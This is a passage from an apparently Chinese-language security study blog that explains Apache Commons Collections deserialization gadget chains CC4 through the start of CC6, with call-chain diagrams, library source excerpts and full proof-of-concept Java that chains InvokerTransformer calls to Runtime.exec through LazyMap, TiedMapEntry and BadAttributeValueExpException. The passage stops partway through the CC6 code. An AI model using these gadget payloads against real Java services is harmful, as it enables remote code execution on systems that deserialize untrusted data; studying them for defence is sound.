<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java">        PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>        Object[] queue_array =<span class="hljs-keyword">new</span> Object[] &#123;templatesimpl, <span class="hljs-number">1</span>&#125;;<br><br>        setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,queue_array);<br>        setFieldValue(queue,<span class="hljs-string">&quot;size&quot;</span>,<span class="hljs-number">2</span>);<br>--------------------------------------------------------------------------------------------------------<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(DEFAULT_INITIAL_CAPACITY, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>(initialCapacity, <span class="hljs-keyword">null</span>);<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">PriorityQueue</span><span class="hljs-params">(<span class="hljs-keyword">int</span> initialCapacity,</span></span><br><span class="hljs-params"><span class="hljs-function">                         Comparator&lt;? <span class="hljs-keyword">super</span> E&gt; comparator)</span> </span>&#123;<br>        <span class="hljs-comment">// Note: This restriction of at least one is not actually needed,</span><br>        <span class="hljs-comment">// but continues for 1.5 compatibility</span><br>        <span class="hljs-keyword">if</span> (initialCapacity &lt; <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException();<br>        <span class="hljs-keyword">this</span>.queue = <span class="hljs-keyword">new</span> Object[initialCapacity];<br>        <span class="hljs-keyword">this</span>.comparator = comparator;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">writeObject</span><span class="hljs-params">(java.io.ObjectOutputStream s)</span></span><br><span class="hljs-function">        <span class="hljs-keyword">throws</span> java.io.IOException </span>&#123;<br>        <span class="hljs-comment">// Write out element count, and any hidden stuff</span><br>        s.defaultWriteObject();<br><br>        <span class="hljs-comment">// Write out array length, for compatibility with 1.5 version</span><br>        s.writeInt(Math.max(<span class="hljs-number">2</span>, size + <span class="hljs-number">1</span>));<br><br>        <span class="hljs-comment">// Write out all elements in the &quot;proper order&quot;.</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; size; i++)<br>            s.writeObject(queue[i]);<br>    &#125;<br></code></pre></td></tr></table></figure>

<p>ÊòØÁ≠â‰ª∑‰∫éÁõ¥Êé•<code>new PriorityQueue(2)</code>ÁöÑÔºå<code>PriorityQueue.queue[2]</code>ÔºåÂ∫èÂàóÂåñÊó∂ÊòØ‰∏ç‰ºöÊä•Êï∞ÁªÑË∂äÁïåÁöÑ</p>
<p>CC4 ËøôÈáå<code>initialCapacity</code>ËÆæÁΩÆ 1ÔºåÂç¥Ê≤°ÊúâÂèçÂ∞Ñ‰øÆÊîπ<code>queue[]</code>Ôºå‰∫éÊòØÂú®<code>PriorityQueue.writeObject</code>Âá∫Áé∞Êï∞ÁªÑË∂äÁïå(‰∏∫‰ªÄ‰πàÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπ<code>size</code>Âú® CC2 ‰∏≠ÊúâËØ¥Êòé)Ôºå‰∏çË∞ÉËØï‰∫ÜÔºåÁõ¥Êé•ÂèçÂ∞ÑÊîπ queue Êï∞ÁªÑÁúãÁúã</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">      PriorityQueue queue = <span class="hljs-keyword">new</span> PriorityQueue(<span class="hljs-number">1</span>);<br>setFieldValue(queue,<span class="hljs-string">&quot;queue&quot;</span>,<span class="hljs-keyword">new</span> Object[<span class="hljs-number">2</span>]);<br></code></pre></td></tr></table></figure>

<p>È™åËØÅÊàêÂäü</p>
<h2 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h2><h3 id="Pre-4"><a href="#Pre-4" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-4"><a href="#ÈôêÂà∂-4" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-4"><a href="#Âà©Áî®Èìæ-4" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BadAttributeValueExpException</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span><span class="hljs-keyword">to</span><span class="hljs-constructor">String()</span><br>                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                      <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ConstantTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Class</span>.</span></span>get<span class="hljs-constructor">Method()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>get<span class="hljs-constructor">Runtime()</span><br>                          <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                              <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                                  <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-4"><a href="#ÂÖ≥ÈîÆÁ±ª-4" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">BadAttributeValueExpException</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<h4 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h4><p>CC5 ÊòØÊîπÈÄ†‰∫Ü CC1ÔºåCC1 ‰∏≠<code>LazyMap.get</code>Êâæ‰∏çÂà∞ÂÄºË∞ÉÁî®<code>transform</code>ÊñπÊ≥ï‰ªéËÄå RCEÔºõCC5 Áî®‰∫Ü<code>TiedMapEntry.toString</code>ÊñπÊ≥ï</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">TiedMapEntry</span><span class="hljs-params">(Map map, Object key)</span> </span>&#123;<br>       <span class="hljs-keyword">super</span>();<br>       <span class="hljs-keyword">this</span>.map = map;<br>       <span class="hljs-keyword">this</span>.key = key;<br>   &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> getKey() + <span class="hljs-string">&quot;=&quot;</span> + getValue();<br>   &#125;<br><br>   <span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>       <span class="hljs-keyword">return</span> map.get(key);<br>   &#125;<br></code></pre></td></tr></table></figure>

<p>ÂèØËßÅ<code>map key</code>ÂùáÂèØÊéßÔºåÊâÄ‰ª•Ê≠§Â§ÑËÆæÁΩÆ map ‰∏∫ CC1 ‰∏≠ÁöÑ<code>LazyMap</code>Â∞±ËÉΩ RCE ‰∫Ü</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        tiedMapEntry.toString();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h4 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h4><p>Â¶Ç‰ΩïÂéªË∞ÉÁî®<code>TiedMapEntry.toString</code>Âπ∂‰∏îÂ∫èÂàóÂåñÂë¢Ôºå‰∏∫‰∫Ü‰∏çÂèó jdk ÁâàÊú¨ÈôêÂà∂ÔºåCC5 ‰ΩøÁî®‰∫Ü<code>BadAttributeValueExpException</code>Á±ª</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/190468#h3-3">https://www.anquanke.com/post/id/190468#h3-3</a></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> </span>&#123;<br>    <span class="hljs-keyword">this</span>.val = val == <span class="hljs-keyword">null</span> ? <span class="hljs-keyword">null</span> : val.toString();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException </span>&#123;<br>    ObjectInputStream.GetField gf = ois.readFields();<br>    Object valObj = gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-keyword">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-keyword">null</span>) &#123;<br>        val = <span class="hljs-keyword">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-keyword">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>Áõ¥Êé•ÊûÑÈÄ†ÁöÑËØù‰ºöÁõ¥Êé•Ëß¶Âèë</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(tiedMapEntry);<br></code></pre></td></tr></table></figure>

<p>Âõ†Ê≠§ÈÄöËøáÂèçÂ∞Ñ‰øÆÊîπÊù•ËßÑÈÅøËß¶Âèë</p>
<h3 id="Gadget-4"><a href="#Gadget-4" class="headerlink" title="Gadget"></a>Gadget</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC5;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC5</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException </span>&#123;<br>        ChainedTransformer chainedTransformer = <span class="hljs-keyword">new</span> ChainedTransformer(<span class="hljs-keyword">new</span> Transformer[]&#123;<br>                <span class="hljs-keyword">new</span> ConstantTransformer(Runtime.class),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> Class[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> Object[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        HashMap hm = <span class="hljs-keyword">new</span> HashMap();<br>        Map decorate = LazyMap.decorate(hm, chainedTransformer);<br>        TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(decorate, <span class="hljs-number">1</span>);<br>        BadAttributeValueExpException badAttributeValueExpException = <span class="hljs-keyword">new</span> BadAttributeValueExpException(<span class="hljs-number">1</span>);<br>        Field valF = BadAttributeValueExpException.class.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valF.setAccessible(<span class="hljs-keyword">true</span>);<br>        valF.set(badAttributeValueExpException,tiedMapEntry);<br><br>        ByteArrayOutputStream baos = <span class="hljs-keyword">new</span> ByteArrayOutputStream();<br>        ObjectOutputStream oos = <span class="hljs-keyword">new</span> ObjectOutputStream(baos);<br>        oos.writeObject(badAttributeValueExpException);<br>        oos.flush();<br>        oos.close();<br><br>        ByteArrayInputStream bais = <span class="hljs-keyword">new</span> ByteArrayInputStream(baos.toByteArray());<br>        ObjectInputStream ois = <span class="hljs-keyword">new</span> ObjectInputStream(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><h3 id="Pre-5"><a href="#Pre-5" class="headerlink" title="Pre"></a>Pre</h3><h4 id="ÈôêÂà∂-5"><a href="#ÈôêÂà∂-5" class="headerlink" title="ÈôêÂà∂"></a>ÈôêÂà∂</h4><blockquote>
<p>jdk ÊöÇÊó†ÈôêÂà∂</p>
<p>CommonsCollections 3.1 - 3.2.1</p>
</blockquote>
<h4 id="Âà©Áî®Èìæ-5"><a href="#Âà©Áî®Èìæ-5" class="headerlink" title="Âà©Áî®Èìæ"></a>Âà©Áî®Èìæ</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ObjectInputStream</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashSet</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>put<span class="hljs-literal">()</span><br>        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">HashMap</span>.</span></span>hash<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>hash<span class="hljs-constructor">Code()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TiedMapEntry</span>.</span></span>get<span class="hljs-constructor">Value()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">LazyMap</span>.</span></span>get<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">ChainedTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><span class="hljs-operator"></span><br><span class="hljs-operator">                    ...</span><br><span class="hljs-operator">                    </span><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">InvokerTransformer</span>.</span></span>transform<span class="hljs-literal">()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Method</span>.</span></span>invoke<span class="hljs-literal">()</span><br>                        <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">Runtime</span>.</span></span>exec<span class="hljs-literal">()</span><br></code></pre></td></tr></table></figure>

<h4 id="ÂÖ≥ÈîÆÁ±ª-5"><a href="#ÂÖ≥ÈîÆÁ±ª-5" class="headerlink" title="ÂÖ≥ÈîÆÁ±ª"></a>ÂÖ≥ÈîÆÁ±ª</h4><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">TiedMapEntry</span><br><span class="hljs-attribute">HashSet</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Transformer</span><br><span class="hljs-attribute">ConstantTransformer</span><br><span class="hljs-attribute">InvokerTransformer</span><br><span class="hljs-attribute">ChainedTransformer</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">HashMap</span><br><span class="hljs-attribute">LazyMap</span><br></code></pre></td></tr></table></figure>

<p>CC6 ‰ªçÁÑ∂Âíå CC5 ÊÄùË∑ØÁõ∏ÂêåÔºåÂâçÂçäÈÉ®ÂàÜÈÉΩÊòØ CC1ÔºåCC5 Áî®‰∫Ü<code>TiedMapEntry.toString</code>ÊñπÊ≥ïËøõËÄåË∞ÉÁî®ÂÖ∂<code>getValue</code>ÔºåËß¶Âèë<code>LazyMap.get</code>Âêé RCE</p>
<p>CC6 ‰ΩøÁî®ÁöÑÊòØ<code>TiedMapEntry.hashcode</code>ÊñπÊ≥ïÊù•Ëß¶ÂèëÁöÑ‰∏é CC5<code>toString</code>‰∏ÄÊ†∑Ë∞ÉÁî®ÂÖ∂<code>getValue</code>ÔºåËøõËÄåËß¶Âèë<code>LazyMap.get</code>RCE</p>
<p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20230424201812179.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">hashCode</span><span class="hljs-params">()</span> </span>&#123;<br>    Object value = getValue();<br>    <span class="hljs-keyword">return</span> (getKey() == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : getKey().hashCode()) ^<br>           (value == <span class="hljs-keyword">null</span> ? <span class="hljs-number">0</span> : value.hashCode());<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getValue</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> CommonsCollections.CC6;<br><br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CC6poc</span> </span>&#123;<br>    <span 